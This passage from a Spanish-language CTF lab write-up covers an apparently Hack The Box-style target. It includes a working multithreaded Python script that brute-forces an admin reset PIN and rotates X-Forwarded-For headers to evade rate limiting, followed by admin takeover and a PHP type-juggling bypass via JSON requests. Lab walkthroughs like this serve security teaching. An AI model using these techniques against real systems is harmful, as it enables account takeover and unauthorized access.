+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#34;laravel_session&#34;</span>: <span style="color:#a5d6ff">&#34;eyJpdiI6IkQxSktxZGtBOURFOXlpTlVyVXlwdlE9PSIsInZhbHVlIjoiUElXOW5DWHAxSkVwdkNNVVV4SG16cWhob1BzLzlCcFRubHUzRDhKY0JRdkU5NFZ3eVZYSEZFdG8yanhGZnF6cVp4eWNVSGdvL2pzYjhtV1orR2tnazQ4SEY5OTYxcmltQitua2ZrTTgyVzVlK1UrRWpIRjc3M2hKejZwWGREWWEiLCJtYWMiOiJiYWUzMGM1MDc5OTliMjhmYWRiMTI2Y2ZhNWZhMzY0ZTkxYjk0YmI0NjE5MDk3M2FhZjJmNTE1ZWY2YzBlNDczIiwidGFnIjoiIn0%3D&#34;</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HEADERS_BASE <span style="color:#ff7b72;font-weight:bold">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#34;User-Agent&#34;</span>: <span style="color:#a5d6ff">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#34;Accept&#34;</span>: <span style="color:#a5d6ff">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#34;Content-Type&#34;</span>: <span style="color:#a5d6ff">&#34;application/x-www-form-urlencoded&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#34;Origin&#34;</span>: <span style="color:#a5d6ff">&#34;http://10.129.227.109&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#34;Referer&#34;</span>: <span style="color:#a5d6ff">&#34;http://10.129.227.109/reset&#34;</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>lock       <span style="color:#ff7b72;font-weight:bold">=</span> Lock()
+</span></span><span style="display:flex;"><span>stop_event <span style="color:#ff7b72;font-weight:bold">=</span> Event()
+</span></span><span style="display:flex;"><span>done_count <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>
+</span></span><span style="display:flex;"><span>found_pin  <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>prog <span style="color:#ff7b72;font-weight:bold">=</span> log<span style="color:#ff7b72;font-weight:bold">.</span>progress(<span style="color:#a5d6ff">&#34;Fuzzing PIN&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">attempt</span>(i: int):
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#34;&#34;&#34;Envía una petición con el PIN i. Rotación XFF: bloque = i // 50.&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> stop_event<span style="color:#ff7b72;font-weight:bold">.</span>is_set():
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">return</span> <span style="color:#79c0ff">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    pin <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;</span><span style="color:#a5d6ff">{</span>i<span style="color:#a5d6ff">:</span><span style="color:#a5d6ff">04d</span><span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#34;</span>
+</span></span><span style="display:flex;"><span>    xff <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;10.10.10.</span><span style="color:#a5d6ff">{</span><span style="color:#a5d6ff">10</span> <span style="color:#ff7b72;font-weight:bold">+</span> i <span style="color:#ff7b72;font-weight:bold">//</span> <span style="color:#a5d6ff">50</span><span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    headers <span style="color:#ff7b72;font-weight:bold">=</span> HEADERS_BASE<span style="color:#ff7b72;font-weight:bold">.</span>copy()
+</span></span><span style="display:flex;"><span>    headers[<span style="color:#a5d6ff">&#34;X-Forwarded-For&#34;</span>] <span style="color:#ff7b72;font-weight:bold">=</span> xff
+</span></span><span style="display:flex;"><span>    data <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;name=admin&amp;pin=</span><span style="color:#a5d6ff">{</span>pin<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#ff7b72;font-weight:bold">=</span> requests<span style="color:#ff7b72;font-weight:bold">.</span>post(URL, headers<span style="color:#ff7b72;font-weight:bold">=</span>headers, cookies<span style="color:#ff7b72;font-weight:bold">=</span>COOKIES,
+</span></span><span style="display:flex;"><span>                          data<span style="color:#ff7b72;font-weight:bold">=</span>data, timeout<span style="color:#ff7b72;font-weight:bold">=</span>TIMEOUT)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">except</span> requests<span style="color:#ff7b72;font-weight:bold">.</span>RequestException <span style="color:#ff7b72">as</span> e:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">return</span> (<span style="color:#a5d6ff">&#34;error&#34;</span>, i, pin, str(e))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">global</span> done_count
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">with</span> lock:
+</span></span><span style="display:flex;"><span>        done_count <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#a5d6ff">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span> done_count <span style="color:#ff7b72;font-weight:bold">%</span> <span style="color:#a5d6ff">25</span> <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">0</span>:
+</span></span><span style="display:flex;"><span>            prog<span style="color:#ff7b72;font-weight:bold">.</span>status(<span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;</span><span style="color:#a5d6ff">{</span>done_count<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">/</span><span style="color:#a5d6ff">{</span>TOTAL<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff"> peticiones&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> len(r<span style="color:#ff7b72;font-weight:bold">.</span>text) <span style="color:#ff7b72;font-weight:bold">==</span> IGNORE_LEN:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">return</span> (<span style="color:#a5d6ff">&#34;ignored&#34;</span>, i, pin, <span style="color:#79c0ff">None</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> (<span style="color:#a5d6ff">&#34;hit&#34;</span>, i, pin, (r<span style="color:#ff7b72;font-weight:bold">.</span>status_code, r<span style="color:#ff7b72;font-weight:bold">.</span>text))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">with</span> ThreadPoolExecutor(max_workers<span style="color:#ff7b72;font-weight:bold">=</span>THREADS) <span style="color:#ff7b72">as</span> ex:
+</span></span><span style="display:flex;"><span>    futures <span style="color:#ff7b72;font-weight:bold">=</span> {ex<span style="color:#ff7b72;font-weight:bold">.</span>submit(attempt, i): i <span style="color:#ff7b72">for</span> i <span style="color:#ff7b72;font-weight:bold">in</span> range(TOTAL)}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> fut <span style="color:#ff7b72;font-weight:bold">in</span> as_completed(futures):
+</span></span><span style="display:flex;"><span>        res <span style="color:#ff7b72;font-weight:bold">=</span> fut<span style="color:#ff7b72;font-weight:bold">.</span>result()
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span> res <span style="color:#ff7b72;font-weight:bold">is</span> <span style="color:#79c0ff">None</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">continue</span>
+</span></span><span style="display:flex;"><span>        kind, i, pin, payload <span style="color:#ff7b72;font-weight:bold">=</span> res
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span> kind <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">&#34;ignored&#34;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">continue</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span> kind <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">&#34;error&#34;</span>:
+</span></span><span style="display:flex;"><span>            log<span style="color:#ff7b72;font-weight:bold">.</span>warning(<span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;[</span><span style="color:#a5d6ff">{</span>i<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">] pin=</span><span style="color:#a5d6ff">{</span>pin<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff"> error: </span><span style="color:#a5d6ff">{</span>payload<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        status, body <span style="color:#ff7b72;font-weight:bold">=</span> payload
+</span></span><span style="display:flex;"><span>        print(<span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">[+] pin=</span><span style="color:#a5d6ff">{</span>pin<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">  status=</span><span style="color:#a5d6ff">{</span>status<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">  len=</span><span style="color:#a5d6ff">{</span>len(body)<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(body[:<span style="color:#a5d6ff">500</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span> status <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">200</span>:
+</span></span><span style="display:flex;"><span>            found_pin <span style="color:#ff7b72;font-weight:bold">=</span> pin
+</span></span><span style="display:flex;"><span>            stop_event<span style="color:#ff7b72;font-weight:bold">.</span>set()
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> f <span style="color:#ff7b72;font-weight:bold">in</span> futures:
+</span></span><span style="display:flex;"><span>        f<span style="color:#ff7b72;font-weight:bold">.</span>cancel()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">if</span> found_pin:
+</span></span><span style="display:flex;"><span>    prog<span style="color:#ff7b72;font-weight:bold">.</span>success(<span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;PIN encontrado: </span><span style="color:#a5d6ff">{</span>found_pin<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">else</span>:
+</span></span><span style="display:flex;"><span>    prog<span style="color:#ff7b72;font-weight:bold">.</span>failure(<span style="color:#a5d6ff">&#34;PIN no encontrado&#34;</span>)
+</span></span></code></pre></div><p>El script envía las peticiones en paralelo (<code>ThreadPoolExecutor</code>), rotando la cabecera <code>X-Forwarded-For</code> cada 50 intentos para evitar el rate limit, y descarta las respuestas cuyo tamaño coincide con el de un PIN inválido. Encontramos así el <code>pin</code> válido: <code>2798</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Fuzzing PIN: PIN encontrado: <span style="color:#a5d6ff">2798</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#79c0ff">pin</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">2798</span>  <span style="color:#79c0ff">status</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">200</span>  <span style="color:#79c0ff">len</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">5372</span>
+</span></span><span style="display:flex;"><span>&lt;!doctype html&gt;
+</span></span><span style="display:flex;"><span>&lt;!--<span style="color:#ff7b72;font-weight:bold">[</span><span style="color:#ff7b72">if</span> lt IE 7<span style="color:#ff7b72;font-weight:bold">]</span>&gt;      &lt;html <span style="color:#79c0ff">class</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;no-js lt-ie9 lt-ie8 lt-ie7&#34;</span> <span style="color:#79c0ff">lang</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;&#34;</span>&gt; &lt;!<span style="color:#ff7b72;font-weight:bold">[</span>endif<span style="color:#ff7b72;font-weight:bold">]</span>--&gt;
+</span></span><span style="display:flex;"><span>&lt;!--<span style="color:#ff7b72;font-weight:bold">[</span><span style="color:#ff7b72">if</span> IE 7<span style="color:#ff7b72;font-weight:bold">]</span>&gt;         &lt;html <span style="color:#79c0ff">class</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;no-js lt-ie9 lt-ie8&#34;</span> <span style="color:#79c0ff">lang</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;&#34;</span>&gt; &lt;!<span style="color:#ff7b72;font-weight:bold">[</span>endif<span style="color:#ff7b72;font-weight:bold">]</span>--&gt;
+</span></span><span style="display:flex;"><span>&lt;!--<span style="color:#ff7b72;font-weight:bold">[</span><span style="color:#ff7b72">if</span> IE 8<span style="color:#ff7b72;font-weight:bold">]</span>&gt;         &lt;html <span style="color:#79c0ff">class</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;no-js lt-ie9&#34;</span> <span style="color:#79c0ff">lang</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;&#34;</span>&gt; &lt;!<span style="color:#ff7b72;font-weight:bold">[</span>endif<span style="color:#ff7b72;font-weight:bold">]</span>--&gt;
+</span></span><span style="display:flex;"><span>&lt;!--<span style="color:#ff7b72;font-weight:bold">[</span><span style="color:#ff7b72">if</span> gt IE 8<span style="color:#ff7b72;font-weight:bold">]</span>&gt;&lt;!--&gt; &lt;html <span style="color:#79c0ff">class</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;no-js&#34;</span> <span style="color:#79c0ff">lang</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;&#34;</span>&gt; &lt;!--&lt;!<span style="color:#ff7b72;font-weight:bold">[</span>endif<span style="color:#ff7b72;font-weight:bold">]</span>--&gt;
+</span></span><span style="display:flex;"><span>&lt;head&gt;
+</span></span><span style="display:flex;"><span>    &lt;meta <span style="color:#79c0ff">charset</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;meta http-equiv<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;X-UA-Compatible&#34;</span> <span style="color:#79c0ff">content</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;IE=edge&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;title&gt;UHC March Finals&lt;/title&gt;
+</span></span><span style="display:flex;"><span>    &lt;meta <span style="color:#79c0ff">name</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;description&#34;</span> <span style="color:#79c0ff">content</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;UHC March Fi
+</span></span></span></code></pre></div><p>Ahora, en <code>/api/resettoken</code> podemos cambiar la contraseña y luego iniciar sesión como <code>admin</code>.</p>
+<img src="/images/Pasted image 20261029215217.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="control-de-acceso-en-apigetprofile">
+  Control de acceso en /api/getprofile
+  <a class="heading-link" href="#control-de-acceso-en-apigetprofile">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Ya autenticados, la aplicación nos permite ver el perfil de los participantes en una lista. Al interceptar la petición tenemos lo siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">GET</span> <span style="color:#ff7b72">/api/getprofile?id=1&amp;secret=89cb389c73f667c5511ce169033089cb</span> <span style="color:#ff7b72">HTTP</span><span style="color:#ff7b72;font-weight:bold">/</span><span style="color:#a5d6ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">10.129.227.109</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">*/*</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">gzip, deflate, br</span>
+</span></span><span style="display:flex;"><span>X-Requested-With<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">XMLHttpRequest</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">http://10.129.227.109/</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">XSRF-TOKEN=eyJpdiI6IlQwVCtoMFVaMzNpWVdqUmpKWTU3RlE9PSIsInZhbHVlIjoiZ05tZjdjQmZNa2FUR2o2YzZhU2dsOWtxN2pnUy9nRVNxbDZNcDlvRTBFOTc5eDl0ZHhsRFFmenE2UnZBWUFpNXgwYnd6Y1FXSUQ1NmVkd3lJRFVlUE92cFpIaTlvTDBqVitwVG1CaXQrbFNiTlEwQnY5cTdhQWQxV0tROUpiQXEiLCJtYWMiOiJjMDE1MjgzYWVlNDRkNmM2NzJhMDU0ZDk5M2EwOGJlM2ZhMzhjOWVjOGYxY2I1NmI2ZmU0ZWY4ZDJkMDZkZTA0IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImF4RkNzb3cxQmFnbjZ3WWJsd3RBcUE9PSIsInZhbHVlIjoibTVTUXp2N3hCNm5YaHhsLzJNTUNTNUE5Z0pDRnduL29tZE9OaXBuZ2dOcmRBdlBhY2orb1ZDeEtodHNNSUxYd1VqWDhPL2ZPUHA5bnhtNDMyMFJsaDVnOHVJV2sxRkZ5Z3NnNkJ0Q0szQWo5R0xVeHJmZlAwVEw0aFYxRGwwemMiLCJtYWMiOiI0YTU5MTAxYWQwYTYwOTgzYjVmNzk1MzFlZGI5YjQzOTYzYTMwYWExNzQ1NTE3Y2M5Nzc5MDg3ZWE3ODgzNDA3IiwidGFnIjoiIn0%3D</span>
+</span></span><span style="display:flex;"><span>Priority<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">u=0</span>
+</span></span></code></pre></div><p>Y vemos la siguiente respuesta para <code>id=1</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#ff7b72">HTTP</span><span style="color:#ff7b72;font-weight:bold">/</span><span style="color:#a5d6ff">1.1</span> <span style="color:#a5d6ff">200</span> <span style="color:#f0883e;font-weight:bold">OK</span>
+</span></span><span style="display:flex;"><span>Server<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">nginx/1.18.0 (Ubuntu)</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">text/html; charset=UTF-8</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">no-cache, private</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">Fri, 30 Oct 2026 00:51:11 GMT</span>
+</span></span><span style="display:flex;"><span>X-RateLimit-Limit<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">60</span>
+</span></span><span style="display:flex;"><span>X-RateLimit-Remaining<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">58</span>
+</span></span><span style="display:flex;"><span>Access-Control-Allow-Origin<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">*</span>
+</span></span><span style="display:flex;"><span>Set-Cookie<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">laravel_session=eyJpdiI6InZ5cVhUcC9sTFRjZnN3SzcvREhyVWc9PSIsInZhbHVlIjoiaUhXdnEwUEtjVmo3NjJ1RHNIU2I4UGtySkcrOTNpeGdTM1p5dTl6T3lBcThzb3Z3T0hjMWVDd1A1WmZvdDZ1S1BZWVl6TUtPOVZsV2prWDk3VUd3aFpGMXNjMmNuazJhTTRxUnZwSUE0dGpkbmhCOU91QlFPWG42dnRISWhGQmsiLCJtYWMiOiIyZDM1MTUzMzI1OTk3ZDQwM2YyZjA3NzAzZWM3MmI4OTcwZWY5YjViNDEzODYxN2Q1NmIxNTBlNzFkOGRhMjI2IiwidGFnIjoiIn0%3D; expires=Fri, 30-Oct-2026 02:51:11 GMT; Max-Age=7200; path=/; samesite=lax</span>
+</span></span><span style="display:flex;"><span>X-Frame-Options<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">SAMEORIGIN</span>
+</span></span><span style="display:flex;"><span>X-Content-Type-Options<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">nosniff</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">280</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Big0us is a man of mystery, there is not much known about him and due to winning the first UHC Season 1 Tournament, there isn&#39;t much footage for others to study. The only thing players can gather about this guy is what is on his &lt;<span style="color:#7ee787">a</span> href<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;bigous.me&#34;</span>&gt;blog&lt;/<span style="color:#7ee787">a</span>&gt; and that he can hack.
+</span></span></code></pre></div><p>Si cambiamos el <code>id</code> a <code>2</code>, nos muestra el siguiente mensaje:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#ff7b72">HTTP</span><span style="color:#ff7b72;font-weight:bold">/</span><span style="color:#a5d6ff">1.1</span> <span style="color:#a5d6ff">200</span> <span style="color:#f0883e;font-weight:bold">OK</span>
+</span></span><span style="display:flex;"><span>Server<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">nginx/1.18.0 (Ubuntu)</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">text/html; charset=UTF-8</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">no-cache, private</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">Fri, 30 Oct 2026 00:53:30 GMT</span>
+</span></span><span style="display:flex;"><span>X-RateLimit-Limit<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">60</span>
+</span></span><span style="display:flex;"><span>X-RateLimit-Remaining<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">57</span>
+</span></span><span style="display:flex;"><span>Access-Control-Allow-Origin<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">*</span>
+</span></span><span style="display:flex;"><span>Set-Cookie<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">laravel_session=eyJpdiI6IlVKYlNyU2pGeFJKYzdFNTFUQTlaYlE9PSIsInZhbHVlIjoiajFjN0Rveno3WFdadW56U1BwZlVCWWZsV2hNaFNCRmlDTjRqeXhSVW9mby9Jcm1FbnNLTm16QWNBR0x2Y08xRE9pdkd5b0lpN1BncjFVN3dsU29GbnozNERxejBSNDduMGRiS3dTcytBVk5QYkFmM2pZdWx2OUFQaDJVRE5rWmoiLCJtYWMiOiI1ZjdjZjE5ZjM3MzZjNmI4NmY1YmFkNzhiNDZjNjAzZDA1NWE5ZDg1ZjJlOGMwMjA1MWUzOGRiYmJlMThlNGM4IiwidGFnIjoiIn0%3D; expires=Fri, 30-Oct-2026 02:53:30 GMT; Max-Age=7200; path=/; samesite=lax</span>
+</span></span><span style="display:flex;"><span>X-Frame-Options<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">SAMEORIGIN</span>
+</span></span><span style="display:flex;"><span>X-Content-Type-Options<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">nosniff</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">28</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Tampered user input detected
+</span></span></code></pre></div><p>El mensaje <code>Tampered user input detected</code> indica que el servidor valida el parámetro <code>secret</code> contra el <code>id</code> solicitado (probablemente comparando contra un hash conocido con el operador flojo <code>==</code> de PHP). No es un IDOR &ldquo;puro&rdquo; —hay un control pensado para evitarlo—, pero como se ve a continuación, ese control se puede saltar explotando cómo PHP compara tipos distintos (<strong>Type Juggling</strong>).</p>
+<h1 id="bypass-vía-content-type-json--php-type-juggling">
+  Bypass vía Content-Type JSON + PHP Type Juggling
+  <a class="heading-link" href="#bypass-v%c3%ada-content-type-json--php-type-juggling">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Si enviamos los mismos parámetros <code>id=1</code> y <code>secret=89cb389c73f667c5511ce169033089cb</code>, pero como JSON —cambiando el <code>Content-Type</code> a <code>application/json</code>— la aplicación procesa igualmente la petición:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#a5d6ff">54</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#34;id&#34;</span>:<span style="color:#a5d6ff">&#34;1&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#34;secret&#34;</span>:<span style="color:#a5d6ff">&#34;89cb389c73f667c5511ce169033089cb&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">}</span>
+</span></span></code></pre></div><p>Y vemos que la web procesa bien los datos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Content-Length: <span style="color:#a5d6ff">280</span>
+</span></span><span style="display:flex;"><span>
